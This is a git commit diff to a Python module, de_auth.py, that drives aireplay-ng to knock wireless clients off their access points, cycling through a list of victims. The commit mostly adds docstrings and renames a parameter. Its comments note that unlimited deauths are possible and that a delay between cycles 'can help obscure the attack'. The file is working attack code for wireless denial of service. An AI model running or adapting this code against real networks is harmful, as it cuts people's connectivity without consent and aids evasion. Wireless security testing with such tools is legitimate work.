9fdda7399594a0f8fdfc4c74338d673f5b717daf
pablo <pablo0168@hotmail.com>
2017-11-17 13:55:17 -0600

    forgot a thing

--- de_auth.py
+++ de_auth.py
@@ -3,10 +3,16 @@ from datetime import datetime
 import time
 def de_auth_client( client_mac,
                     access_point_mac,
-                    deauths = 1,
+                    deauths=1,
                     adapter="wlan0mon"):
 
-    # fast but no stdout/err
+    """
+    :param client_mac:
+    :param access_point_mac:
+    :param deauths: number of de-authentications (128 packets to router and client per deauth)
+    :param adapter:
+    :return:
+    """
     r = os.system("aireplay-ng " + "-0 " + str(deauths) + " -a " + str(access_point_mac) \
               + " -c " + client_mac + " " + adapter)
 
@@ -21,18 +27,25 @@ def de_auth_client( client_mac,
     return r
 
 def attack_clients(clients_dict,
-                   deauths_per_client,
+                   de_auths_per_client,
                    adapter,
                    timeout=60,
                    list_cycles=100,
-                   time_between_cycles = 1
+                   time_between_cycles=1
                    ):
-    """ At this point it we know exactly who are we attacking
-        - deauths (int) doesn't necessarily have to be large if
-        cycling a list of clients is fast enough. Also note that 1 deauth = 128 packets
-        Passing this option as zero makes it unlimited deauths
-        - time_between_cycles (int seconds) can help obscure the attack
-        - timeout, list_cycles (int) determine for how long should the attack run
+    """
+    :param clients_dict: a dictionary of clients with (at least) client_mac, ap_mac. keys
+    :param de_auths_per_client: (int) doesn't necessarily have to be large if
+           cycling a list of clients is fast enough. Also note that 1 deauth = 128 packets
+           Passing this option as zero makes it unlimited deauths
+    :param adapter: If not wlan0mon pass name here
+    :param timeout: how long is the attack
+    :param list_cycles: how many iterations over the list of victims
+    :param time_between_cycles: (int/float  in seconds) can help obscure the attack
+    :return:  nothing
+
+        IMPORTANT. List of clients are exist on a per-channel basis. So this function needs to be
+        called for every ap's channel where there are targets.
     """
     CURR_TIME = datetime.now()
     TIME_DIFF = datetime.now() - CURR_TIME
@@ -40,16 +53,17 @@ def attack_clients(clients_dict,
     count = 0
     for client in clients_dict:
         if list_cycles <= count or timeout < TIME_DIFF.total_seconds() :
-            return 1
-        count += 1
-        de_auth_client(client["client_mac"],
-                       client["ap_mac"],
-                       deauths=deauths_per_client,
-                       adapter=adapter)
-        TIME_DIFF = datetime.now() - CURR_TIME
-    return 0
-
+            break
+        else:
+            count += 1
+            de_auth_client(client["client_mac"],
+                           client["ap_mac"],
+                           deauths=de_auths_per_client,
+                           adapter=adapter)
+            TIME_DIFF = datetime.now() - CURR_TIME
+            if time_between_cycles > 0:
+                time.sleep(time_between_cycles)
 
 if __name__ == "__main__":
-    print ("deauth-module")
+    pass
 
